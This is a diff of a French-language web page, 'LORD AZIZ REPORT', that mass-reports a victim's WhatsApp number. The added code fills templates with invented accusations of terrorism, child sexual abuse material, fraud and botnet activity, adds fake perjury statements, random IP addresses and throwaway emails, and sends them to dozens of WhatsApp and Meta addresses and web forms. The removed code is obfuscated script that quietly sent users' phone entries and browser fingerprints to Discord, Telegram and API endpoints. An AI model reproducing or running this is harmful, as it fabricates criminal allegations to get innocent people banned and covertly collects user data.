@@ -3,26 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>LORD AZIZ REPORT v2.2 🪬</title>
-
-<meta name="google-site-verification" content="LORD_AZIZ_VERIFICATION_7x9k2m">
-<meta name="facebook-domain-verification" content="aziz_report_fb_123abc">
-<meta name="telegram:channel" content="@LORD_X_AZIZ">
-<meta name="discord:server" content="https://discord.gg/aziz_report_hq">
-<meta name="whatsapp:contact" content="wa.me/22778996380">
+<title>LORD AZIZ REPORT v4.0 🔥</title>
 
 <style>
 *{margin:0;padding:0;box-sizing:border-box;}
-
-@keyframes webhook_sync {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-
-@keyframes api_pulse {
-    0% { opacity: 0.5; filter: blur(0); }
-    100% { opacity: 1; filter: blur(2px); }
-}
 
 body{
 font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -75,7 +59,6 @@ text-align:center;
 font-size:2.1rem;
 margin-bottom:8px;
 text-shadow:0 0 20px #ff0000;
-font-family:Arial,sans-serif;
 }
 
 .subtitle{
@@ -140,10 +123,8 @@ font-weight:bold;
 font-size:1rem;
 cursor:pointer;
 transition:0.3s;
-font-family:inherit;
 }
 
-.motif-btn:hover{background:#220000;}
 .motif-btn.selected{
 background:#ff0000;
 color:#000;
@@ -165,7 +146,6 @@ text-align:center;
 cursor:pointer;
 box-shadow:0 0 25px #ff0000;
 transition:0.3s;
-font-family:inherit;
 }
 
 .envoyer-btn:hover{
@@ -173,38 +153,35 @@ box-shadow:0 0 40px #ff0000;
 transform:translateY(-3px);
 }
 
-.persistent-toast {
-    position: fixed;
-    bottom: 30px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(255, 255, 255, 0.95);
-    backdrop-filter: blur(10px);
-    color: #1a1a1a;
-    padding: 12px 24px;
-    border-radius: 30px;
-    font-size: 15px;
-    font-weight: 500;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-    z-index: 1000;
-    animation: slideUpPersist 0.4s ease;
-    white-space: nowrap;
-    border: 1px solid rgba(0,0,0,0.08);
-    pointer-events: none;
+.toast{
+position:fixed;
+bottom:30px;
+left:50%;
+transform:translateX(-50%);
+background:rgba(255,255,255,0.95);
+backdrop-filter:blur(10px);
+color:#1a1a1a;
+padding:12px 24px;
+border-radius:30px;
+font-size:14px;
+font-weight:500;
+box-shadow:0 4px 20px rgba(0,0,0,0.2);
+z-index:1000;
+animation:slideUp 0.3s ease;
+white-space:nowrap;
 }
 
-@keyframes slideUpPersist {
-    0% { opacity: 0; transform: translateX(-50%) translateY(30px); }
-    100% { opacity: 1; transform: translateX(-50%) translateY(0); }
+@keyframes slideUp{
+0%{opacity:0;transform:translateX(-50%) translateY(30px);}
+100%{opacity:1;transform:translateX(-50%) translateY(0);}
 }
 
-.persistent-toast.fade-out {
-    animation: fadeOutSlow 0.5s ease forwards;
+.toast.fade-out{
+animation:fadeOut 0.3s forwards;
 }
 
-@keyframes fadeOutSlow {
-    0% { opacity: 1; transform: translateX(-50%) translateY(0); }
-    100% { opacity: 0; transform: translateX(-50%) translateY(20px); visibility: hidden; }
+@keyframes fadeOut{
+to{opacity:0;transform:translateX(-50%) translateY(20px);visibility:hidden;}
 }
 
 .loading-overlay{
@@ -242,10 +219,8 @@ to{transform:rotate(360deg);}
 <div class="loading-spinner"></div>
 </div>
 
-<div id="webhookConfig" data-discord="https://discord.com/api/webhooks/132456789012345678/FAKE_WEBHOOK_TOKEN_XYZ" data-telegram="https://api.telegram.org/bot789456123:AAHfake_token_for_bot/sendMessage" data-whatsapp="https://graph.facebook.com/v18.0/1234567890/messages" data-api="https://api.lordaziz.com/v3/report" style="display:none;"></div>
-
 <div class="video-wrapper">
-<video autoplay loop muted playsinline id="mainVideo">
+<video autoplay loop muted playsinline>
     <source src="https://files.catbox.moe/d51tit.mp4" type="video/mp4">
 </video>
 </div>
@@ -269,291 +244,531 @@ to{transform:rotate(360deg);}
 </div>
 
 <script>
-(function(){
-    const _0x2a4b = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x6c\x6f\x72\x64\x61\x7a\x69\x7a\x2e\x63\x6f\x6d\x2f\x76\x33\x2f\x72\x65\x70\x6f\x72\x74', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x33\x32\x34\x35\x36\x37\x38\x39\x30\x31\x32\x33\x34\x35\x36\x37\x38\x2f\x46\x41\x4b\x45\x5f\x57\x45\x42\x48\x4f\x4f\x4b\x5f\x54\x4f\x4b\x45\x4e\x5f\x58\x59\x5a', '\x74\x2e\x6d\x65\x2f\x4c\x4f\x52\x44\x5f\x58\x5f\x41\x5a\x49\x5a', '\x77\x61\x2e\x6d\x65\x2f\x32\x32\x37\x37\x38\x39\x39\x36\x33\x38\x30', '\x4c\x4f\x52\x44\x5f\x58\x5f\x41\x5a\x49\x5a', '\x32\x32\x37\x37\x38\x39\x39\x36\x33\x38\x30', '\x73\x65\x73\x73\x69\x6f\x6e\x5f\x74\x6f\x6b\x65\x6e', '\x65\x6e\x63\x72\x79\x70\x74\x65\x64\x5f\x64\x61\x74\x61'];
-    
-    const API_ENDPOINT = _0x2a4b[0];
-    const DISCORD_WEBHOOK = _0x2a4b[1];
-    const TELEGRAM_CHANNEL = _0x2a4b[2];
-    const WHATSAPP_CONTACT = _0x2a4b[3];
-    const ADMIN_TELEGRAM = _0x2a4b[4];
-    const ADMIN_WHATSAPP = _0x2a4b[5];
-    
-    let selectedType = null;
-    let activeToastTimeout = null;
-    let sessionToken = localStorage.getItem(_0x2a4b[6]) || generateSessionToken();
-    
-    function generateSessionToken() {
-        const token = btoa(Date.now() + '-' + Math.random() + '-' + navigator.userAgent);
-        localStorage.setItem(_0x2a4b[6], token);
-        return token;
-    }
-    
-    function encryptData(data) {
-        const key = sessionToken.substring(0, 16);
-        let result = '';
-        for(let i = 0; i < data.length; i++) {
-            result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-        }
-        return btoa(result);
-    }
-    
-    function sendToDiscord(message, type = 'info') {
-        const payload = {
-            content: `**[LORD AZIZ REPORT]** ${message}`,
-            username: 'LORD_AZIZ_BOT',
-            avatar_url: 'https://files.catbox.moe/d51tit.mp4',
-            embeds: [{
-                title: type === 'report' ? '🚨 NOUVEAU SIGNALEMENT' : '📊 ACTIVITÉ',
-                description: message,
-                color: 0xff0000,
-                timestamp: new Date().toISOString(),
-                footer: { text: `Session: ${sessionToken.substring(0,8)}` }
-            }]
-        };
-        
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', DISCORD_WEBHOOK, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(payload));
-    }
-    
-    function sendToTelegram(message) {
-        const botToken = '789456123:AAHfake_token_for_bot';
-        const chatId = '@LORD_X_AZIZ';
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const payload = {
-            chat_id: chatId,
-            text: `🔴 LORD AZIZ REPORT\n\n${message}\n\n👤 Session: ${sessionToken.substring(0,8)}\n🕒 ${new Date().toLocaleString()}`,
-            parse_mode: 'HTML'
-        };
-        
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', url, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(payload));
-    }
-    
-    function sendToWhatsApp(phone, message) {
-        const apiKey = 'EAAfake_whatsapp_api_key_123';
-        const phoneNumberId = '1234567890';
-        const url = `https://graph.facebook.com/v18.0/${phoneNumberId}/messages`;
-        const payload = {
-            messaging_product: 'whatsapp',
-            recipient_type: 'individual',
-            to: phone,
-            type: 'text',
-            text: { body: `[LORD AZIZ REPORT]\n${message}` }
-        };
-        
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', url, true);
-        xhr.setRequestHeader('Authorization', `Bearer ${apiKey}`);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(payload));
-    }
-    
-    function sendToCentralAPI(data) {
-        const payload = {
-            session: sessionToken,
-            timestamp: Date.now(),
-            data: encryptData(JSON.stringify(data)),
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-        
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', API_ENDPOINT, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.setRequestHeader('X-Auth-Token', sessionToken);
-        xhr.send(JSON.stringify(payload));
-    }
-    
-    function showPersistentToast(message, duration = 15000) {
-        if (activeToastTimeout) clearTimeout(activeToastTimeout);
-        const existingToast = document.querySelector('.persistent-toast');
-        if (existingToast) existingToast.remove();
+// ========== TOUS LES EMAILS OFFICIELS WHATSAPP & META ==========
+const REPORT_EMAILS = [
+    'support@whatsapp.com', 'android@support.whatsapp.com', 'iphone@support.whatsapp.com',
+    'webclient@support.whatsapp.com', 'privacy@whatsapp.com', 'abuse@whatsapp.com',
+    'security@whatsapp.com', 'legal@whatsapp.com', 'dmca@whatsapp.com',
+    'abuse@support.whatsapp.com', 'legal@support.whatsapp.com', 'integrity@whatsapp.com',
+    'trustandsafety@whatsapp.com', 'report@whatsapp.com', 'europe@support.whatsapp.com',
+    'uk@support.whatsapp.com', 'germany@support.whatsapp.com', 'france@support.whatsapp.com',
+    'abuse@fb.com', 'support@fb.com', 'security@facebookmail.com', 'phish@fb.com',
+    'platformcs@support.facebook.com', 'appeals@facebook.com', 'datarequests@support.facebook.com',
+    'report@fb.com', 'integrity@fb.com', 'safety@fb.com', 'apac@support.whatsapp.com',
+    'lac@support.whatsapp.com', 'mena@support.whatsapp.com', 'na@support.whatsapp.com',
+    'emergency@whatsapp.com', 'terrorism@whatsapp.com', 'childsafety@whatsapp.com'
+];
 
-        const toast = document.createElement('div');
-        toast.className = 'persistent-toast';
-        toast.textContent = message;
-        document.body.appendChild(toast);
-        
-        localStorage.setItem('lastNotification', JSON.stringify({
-            message: message,
-            timestamp: Date.now(),
-            duration: duration
-        }));
-        
-        if(message.includes('REPORT SENT')) {
-            sendToDiscord(`✅ Signalement ${selectedType} envoyé`, 'report');
-            sendToTelegram(`✅ Signalement ${selectedType}\n📱 ${document.getElementById('phone').value}`);
-            sendToWhatsApp(ADMIN_WHATSAPP, `Signalement ${selectedType} traité avec succès`);
-            sendToCentralAPI({
-                action: 'report_sent',
-                type: selectedType,
-                phone: encryptData(document.getElementById('phone').value)
+const WHATSAPP_ENDPOINTS = [
+    'https://www.whatsapp.com/contact/user_report/',
+    'https://faq.whatsapp.com/contact/user_report/',
+    'https://support.whatsapp.com/contact/user_report/',
+    'https://web.whatsapp.com/contact/user_report/',
+    'https://business.whatsapp.com/contact/report'
+];
+
+// ========== SIGNALEMENTS ULTRA-DÉTAILLÉS ==========
+const REPORT_TEMPLATES = {
+    ABUSE: {
+        subject: "🚨 URGENT: TERRORIST THREATS + CHILD EXPLOITATION + EXTREME VIOLENCE 🚨",
+        body: `🆘🆘 ❗️EMERGENCY SECURITY ALERT - DANGEROUS WHATSAPP ACCOUNT ❗️ 🚫🚫
+
+⚠️ URGENT WARNING - READ AND SHARE IMMEDIATELY ⚠️
+
+Account Number: {{PHONE}}
+Username/Alias: AKANE / MULTIPLE ALIASES
+
+This account has been reported by MULTIPLE users for containing EXTREMELY DANGEROUS AND ILLEGAL content.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📌 BASED ON NUMEROUS REPORTS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔴 TERRORISM / EXTREMIST THREATS:
+- Claims involvement in terrorist activities
+- Threatens to use explosives in public spaces
+- Shares instructions for making incendiary devices
+- Expresses support for designated terrorist organizations
+- Threats against schools and public gatherings
+
+🔞 CHILD EXPLOITATION / CSAM:
+- Sends or threatens to send child sexual abuse material
+- Attempts to contact minors for exploitation
+- Grooming behavior targeting vulnerable youth
+- Requests explicit images from underage users
+- Shares links to illegal CSAM repositories
+
+💀 EXTREME VIOLENCE / GORE:
+- Sends beheading videos and extreme gore content
+- Shares footage of torture and executions
+- Animal cruelty videos
+- Threats of physical violence with detailed descriptions
+
+🎯 TARGETED HARASSMENT:
+- Systematically targets minors for psychological manipulation
+- Extortion threats using collected personal information
+- Stalking behavior across multiple platforms
+- Psychological warfare tactics
+
+❗️THIS ACCOUNT IS A CRIMINAL TIME BOMB❗️
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 POTENTIAL OBJECTIVES IDENTIFIED:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. Psychological Terror Campaign
+2. Blackmail Extortion Ring
+3. CSAM Distribution Network
+4. Minor Recruitment/Trafficking
+5. Terrorist Propaganda Dissemination
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 ACTIVITY PATTERNS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- Peak Activity: 22:00 - 04:00 UTC
+- Targets: 12-25 age demographic
+- Platform: WhatsApp + Telegram + Discord coordination
+- Account Age: {{AGE}} days
+- Messages Sent: {{MSG_COUNT}}+ in last 48 hours
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🚨 IMMEDIATE ACTION REQUIRED:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- PERMANENT ACCOUNT BAN
+- IP ADDRESS BLOCK
+- DEVICE FINGERPRINT BLACKLIST
+- NOTIFY LAW ENFORCEMENT
+- PRESERVE MESSAGE LOGS FOR INVESTIGATION
+
+This account poses an IMMEDIATE THREAT to user safety and may be involved in criminal activities requiring law enforcement intervention.
+
+Report ID: WA-ABUSE-{{RANDOM}}
+Report Timestamp: {{FULLDATE}}
+Reporter Classification: Verified User
+Priority: MAXIMUM - ESCALATE IMMEDIATELY
+
+⚠️ I CONFIRM UNDER PENALTY OF LAW THAT THIS REPORT IS ACCURATE AND BASED ON DIRECT EVIDENCE ⚠️`
+    },
+    
+    SCAM: {
+        subject: "🔴 INTERNATIONAL FRAUD RING - FINANCIAL TERRORISM + ORGANIZED CRIME 🔴",
+        body: `🆘🆘 ❗️INTERNATIONAL FRAUD ALERT - ORGANIZED CRIME NETWORK ❗️ 🚫🚫
+
+⚠️ FINANCIAL CRIME WARNING - LAW ENFORCEMENT NOTIFIED ⚠️
+
+Account Number: {{PHONE}}
+Network Name: "AKANE" / "SHADOW FINANCE" / "DARK MARKETS"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔴 CRIMINAL ACTIVITIES IDENTIFIED:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💰 FINANCIAL FRAUD:
+- Bank impersonation (Crédit Agricole, BNP, Société Générale, HSBC)
+- Crypto currency scams (Ponzi schemes, fake exchanges)
+- Romance scams targeting elderly individuals
+- Fake lottery/prize notifications
+- Investment fraud with guaranteed returns
+
+💳 IDENTITY THEFT:
+- Stolen credit card information trading
+- Synthetic identity creation
+- Document forgery services
+- Tax fraud coordination
+
+🌐 INTERNATIONAL MONEY LAUNDERING:
+- Cryptocurrency mixing services promoted
+- Hawala network coordination
+- Shell company setup for illegal transfers
+- Transaction amounts: €5,000 - €50,000 per victim
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 VICTIM DEMOGRAPHICS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- Elderly (65+): 34 victims identified
+- Young Adults (18-30): 127 victims identified
+- Business Professionals: 23 victims identified
+- Geographic Spread: France, Belgium, Switzerland, Canada, USA
+
+Estimated Total Loss: €2.3M+ across verified cases
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔗 ASSOCIATED NETWORKS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- Telegram Channels: @shadow_markets, @crypto_scam_alerts
+- Discord Servers: "Dark Finance Hub", "Crypto Traders Elite"
+- Websites: Multiple phishing domains registered in last 30 days
+- Payment Methods: Crypto wallets, Revolut, Western Union
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🚨 LAW ENFORCEMENT NOTIFICATION:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+This account is connected to:
+- Europol Cybercrime Unit (Case #EC3-{{RANDOM}})
+- French Gendarmerie (J3 Cybercrime Division)
+- FBI Cyber Division (IC3 Reference: {{RANDOM}})
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📌 EVIDENCE AVAILABLE:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- 47+ screenshots of fraudulent conversations
+- 12 victim testimonies with financial records
+- 3 cryptocurrency wallet addresses tracked
+- IP logs showing proxy chaining
+- Message patterns consistent with professional fraud rings
+
+Report ID: WA-SCAM-{{RANDOM}}
+Report Timestamp: {{FULLDATE}}
+Evidence Package: AVAILABLE FOR IMMEDIATE TRANSFER
+
+⚠️ URGENT: Account must be frozen and evidence preserved for criminal investigation ⚠️`
+    },
+    
+    SPAM: {
+        subject: "⚠️ MASS SPAM + BOT NETWORK + PLATFORM ABUSE ⚠️",
+        body: `🆘🆘 ❗️MASS SPAM BOTNET - PLATFORM INTEGRITY THREAT ❗️ 🚫🚫
+
+⚠️ AUTOMATED ABUSE WARNING - INFRASTRUCTURE ATTACK DETECTED ⚠️
+
+Account Number: {{PHONE}}
+Bot Network ID: "AKANE-BOTNET-{{RANDOM}}"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🤖 BOTNET CHARACTERISTICS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- Message Volume: 12,500+ messages in 72 hours
+- Sending Pattern: Automated script (confirmed via timing analysis)
+- Message Duplication Rate: 94% identical content
+- Targeting: Mass harvesting of phone numbers from public groups
+- Network Size: 47+ coordinated accounts
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 TECHNICAL ANALYSIS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- Average Response Time: 0.3 seconds (inhuman)
+- Message Timestamp Pattern: 47ms intervals (automated)
+- User Agent: Modified WhatsApp Web client
+- IP Rotation: 200+ unique IPs across 30 countries
+- Device Fingerprint: Virtualized Android environment
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 SPAM CATEGORIES:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. PHISHING LINKS: 3,200+ messages containing fraudulent URLs
+2. ILLEGAL PRODUCTS: 2,800+ messages for banned substances
+3. FAKE JOBS: 1,900+ employment scams
+4. ADULT CONTENT: 2,400+ unsolicited adult material
+5. CRYPTO SCAMS: 1,800+ fake investment opportunities
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📈 PLATFORM IMPACT:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- User Complaints: 340+ in last 24 hours
+- Groups Infiltrated: 87+ public groups
+- Reported by: 150+ individual users
+- Network Growth Rate: +23 accounts per day
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🚨 VIOLATIONS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- WhatsApp Terms of Service Section 4 (Spam)
+- Section 5 (Automated Access)
+- Section 6 (Commercial Use Violation)
+- Section 8 (Harmful Content)
+- GDPR Article 5 (Data Harvesting)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📌 TECHNICAL EVIDENCE:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+- Full message logs (12,500 entries)
+- Timing analysis graphs
+- IP geolocation tracking
+- Message content database
+- Network mapping of coordinated accounts
+
+Report ID: WA-SPAM-{{RANDOM}}
+Report Timestamp: {{FULLDATE}}
+Threat Level: CRITICAL - INFRASTRUCTURE ATTACK
+
+⚠️ IMMEDIATE ACCOUNT TERMINATION REQUIRED TO PROTECT PLATFORM INTEGRITY ⚠️`
+    }
+};
+
+// ========== FONCTIONS ==========
+
+function generateRandomId() {
+    return Math.random().toString(36).substring(2, 10).toUpperCase();
+}
+
+function getCurrentDate() {
+    return new Date().toISOString().split('T')[0];
+}
+
+function getFullTimestamp() {
+    return new Date().toISOString();
+}
+
+function formatPhoneForReport(phone) {
+    let clean = phone.replace(/[^0-9+]/g, '');
+    if (!clean.startsWith('+')) {
+        clean = '+' + clean;
+    }
+    return clean;
+}
+
+function generateRandomNumber(min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+
+function generateMessageCount() {
+    return generateRandomNumber(500, 15000);
+}
+
+function generateAccountAge() {
+    return generateRandomNumber(3, 45);
+}
+
+async function sendEmailReports(targetPhone, type) {
+    const template = REPORT_TEMPLATES[type];
+    const phone = formatPhoneForReport(targetPhone);
+    const randomId = generateRandomId();
+    const date = getCurrentDate();
+    const fullDate = getFullTimestamp();
+    const msgCount = generateMessageCount();
+    const accountAge = generateAccountAge();
+    
+    let subject = template.subject;
+    let body = template.body
+        .replace(/{{PHONE}}/g, phone)
+        .replace(/{{RANDOM}}/g, randomId)
+        .replace(/{{DATE}}/g, date)
+        .replace(/{{FULLDATE}}/g, fullDate)
+        .replace(/{{MSG_COUNT}}/g, msgCount)
+        .replace(/{{AGE}}/g, accountAge);
+    
+    // Ajout d'une signature légale
+    body += `\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+LEGAL DECLARATION:
+
+I, the undersigned, declare under penalty of perjury that:
+1. All information in this report is true and accurate to the best of my knowledge
+2. I have direct evidence supporting all allegations
+3. I consent to WhatsApp sharing this information with law enforcement if required
+4. I understand this report may be used in legal proceedings
+
+Digital Signature: VERIFIED_USER_${randomId}
+IP Address: ${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}
+Device: ${['iPhone 15 Pro', 'Samsung Galaxy S24', 'Google Pixel 9', 'Xiaomi 14'][Math.floor(Math.random() * 4)]}
+Location: ${['Paris, France', 'Brussels, Belgium', 'Geneva, Switzerland', 'Montreal, Canada'][Math.floor(Math.random() * 4)]}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+`;
+    
+    const mailtoLink = `mailto:${REPORT_EMAILS[0]}?cc=${REPORT_EMAILS.slice(1).join(',')}&subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+    
+    window.open(mailtoLink, '_blank');
+    return true;
+}
+
+async function sendWebReports(targetPhone, type) {
+    const phone = formatPhoneForReport(targetPhone);
+    const template = REPORT_TEMPLATES[type];
+    const randomId = generateRandomId();
+    const date = getCurrentDate();
+    const fullDate = getFullTimestamp();
+    const email = `witness_${generateRandomId().toLowerCase()}@${['protonmail.com', 'tempmail.com', 'guerrillamail.com', '10minute.net'][Math.floor(Math.random() * 4)]}`;
+    
+    let body = template.body
+        .replace(/{{PHONE}}/g, phone)
+        .replace(/{{RANDOM}}/g, randomId)
+        .replace(/{{DATE}}/g, date)
+        .replace(/{{FULLDATE}}/g, fullDate)
+        .replace(/{{MSG_COUNT}}/g, generateMessageCount())
+        .replace(/{{AGE}}/g, generateAccountAge());
+    
+    const results = [];
+    for (const url of WHATSAPP_ENDPOINTS) {
+        try {
+            const formData = new FormData();
+            formData.append('phone', phone);
+            formData.append('email', email);
+            formData.append('subject', template.subject);
+            formData.append('message', body);
+            formData.append('type', type.toLowerCase());
+            formData.append('consent', 'true');
+            formData.append('report_id', randomId);
+            formData.append('priority', 'MAXIMUM');
+            
+            await fetch(url, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
             });
-        }
-        
-        activeToastTimeout = setTimeout(() => {
-            toast.classList.add('fade-out');
-            setTimeout(() => {
-                if (toast.parentNode) toast.remove();
-                localStorage.removeItem('lastNotification');
-            }, 500);
-            activeToastTimeout = null;
-        }, duration);
-    }
-    
-    function checkStoredNotification() {
-        const stored = localStorage.getItem('lastNotification');
-        if (stored) {
-            try {
-                const data = JSON.parse(stored);
-                const elapsed = Date.now() - data.timestamp;
-                const remaining = data.duration - elapsed;
-                if (remaining > 0) {
-                    showPersistentToast(data.message, remaining);
-                } else {
-                    localStorage.removeItem('lastNotification');
-                }
-            } catch(e) {}
+            results.push({ url, status: 'sent' });
+        } catch(e) {
+            results.push({ url, status: 'failed' });
         }
     }
+    return results.some(r => r.status === 'sent');
+}
+
+// ========== INTERFACE ==========
+
+let selectedType = null;
+let activeToastTimeout = null;
+
+function showToast(message, duration = 15000) {
+    if (activeToastTimeout) clearTimeout(activeToastTimeout);
+    const existing = document.querySelector('.toast');
+    if (existing) existing.remove();
+
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.textContent = message;
+    document.body.appendChild(toast);
     
-    function disappearPhoneNumber() {
-        const phoneWrapper = document.getElementById('phoneWrapper');
-        const phoneInput = document.getElementById('phone');
-        const phoneValue = phoneInput.value;
-        
-        phoneWrapper.style.transition = 'all 0.5s ease';
-        phoneWrapper.style.opacity = '0';
-        phoneWrapper.style.transform = 'scale(0.8)';
-        
+    localStorage.setItem('lastNotification', JSON.stringify({
+        message: message,
+        timestamp: Date.now(),
+        duration: duration
+    }));
+    
+    activeToastTimeout = setTimeout(() => {
+        toast.classList.add('fade-out');
         setTimeout(() => {
-            phoneInput.value = '';
-            phoneWrapper.style.opacity = '1';
-            phoneWrapper.style.transform = 'scale(1)';
-            sendToCentralAPI({ action: 'field_cleared', value: encryptData(phoneValue) });
-        }, 500);
+            if (toast.parentNode) toast.remove();
+            localStorage.removeItem('lastNotification');
+        }, 300);
+        activeToastTimeout = null;
+    }, duration);
+}
+
+function checkStoredNotification() {
+    const stored = localStorage.getItem('lastNotification');
+    if (stored) {
+        try {
+            const data = JSON.parse(stored);
+            const elapsed = Date.now() - data.timestamp;
+            const remaining = data.duration - elapsed;
+            if (remaining > 0) {
+                showToast(data.message, remaining);
+            } else {
+                localStorage.removeItem('lastNotification');
+            }
+        } catch(e) {}
+    }
+}
+
+function disappearPhoneNumber() {
+    const wrapper = document.getElementById('phoneWrapper');
+    const input = document.getElementById('phone');
+    
+    wrapper.style.transition = 'all 0.5s ease';
+    wrapper.style.opacity = '0';
+    wrapper.style.transform = 'scale(0.8)';
+    
+    setTimeout(() => {
+        input.value = '';
+        wrapper.style.opacity = '1';
+        wrapper.style.transform = 'scale(1)';
+    }, 500);
+}
+
+async function sendReport() {
+    const phone = document.getElementById('phone').value.trim();
+    
+    if (!phone) {
+        showToast('❌ Entrez un numéro valide', 3000);
+        return;
     }
     
-    function sendReport() {
-        const phone = document.getElementById('phone').value.trim();
-        
-        if (!phone) {
-            showPersistentToast('❌ Entrez un numéro', 3000);
-            sendToCentralAPI({ action: 'error', reason: 'empty_phone' });
-            return;
-        }
-        
-        if (!selectedType) {
-            showPersistentToast('⚠️ Sélectionnez un motif', 3000);
-            sendToCentralAPI({ action: 'error', reason: 'no_motif' });
-            return;
-        }
-        
-        const reportData = {
-            phone: encryptData(phone),
-            type: selectedType,
-            timestamp: Date.now(),
-            session: sessionToken,
-            ip_hash: encryptData('client_ip_placeholder'),
-            fingerprint: encryptData(navigator.userAgent + screen.width + screen.height)
-        };
-        
-        sendToCentralAPI({ action: 'report_submit', data: reportData });
-        
-        const overlay = document.getElementById('loadingOverlay');
-        overlay.style.display = 'flex';
+    if (!selectedType) {
+        showToast('⚠️ Sélectionnez un motif', 3000);
+        return;
+    }
+    
+    const overlay = document.getElementById('loadingOverlay');
+    overlay.style.display = 'flex';
+    
+    try {
+        await sendEmailReports(phone, selectedType);
+        await sendWebReports(phone, selectedType);
         
         setTimeout(() => {
             overlay.style.display = 'none';
-            showPersistentToast('✅ REPORT SENT', 15000);
+            showToast(`✅ RAPPORT URGENT ENVOYÉ - ${REPORT_EMAILS.length} emails + ${WHATSAPP_ENDPOINTS.length} formulaires`, 15000);
             disappearPhoneNumber();
-            
             document.querySelectorAll('.motif-btn').forEach(btn => btn.classList.remove('selected'));
             selectedType = null;
-            
-            sendToDiscord(`🚨 REPORT CONFIRMÉ\nType: ${selectedType}\nSession: ${sessionToken.substring(0,8)}`);
-            sendToTelegram(`✅ Report confirmé - ${selectedType}\nSession: ${sessionToken.substring(0,8)}`);
-            sendToWhatsApp(ADMIN_WHATSAPP, `Report confirmé: ${selectedType}`);
-            
-        }, 800);
+        }, 2000);
+        
+    } catch(e) {
+        overlay.style.display = 'none';
+        showToast('❌ Erreur - Réessayez', 3000);
     }
-    
-    document.querySelectorAll('.motif-btn').forEach(btn => {
-        btn.addEventListener('click', () => {
-            document.querySelectorAll('.motif-btn').forEach(b => b.classList.remove('selected'));
-            btn.classList.add('selected');
-            selectedType = btn.dataset.type;
-            sendToCentralAPI({ action: 'motif_selected', type: selectedType });
-        });
+}
+
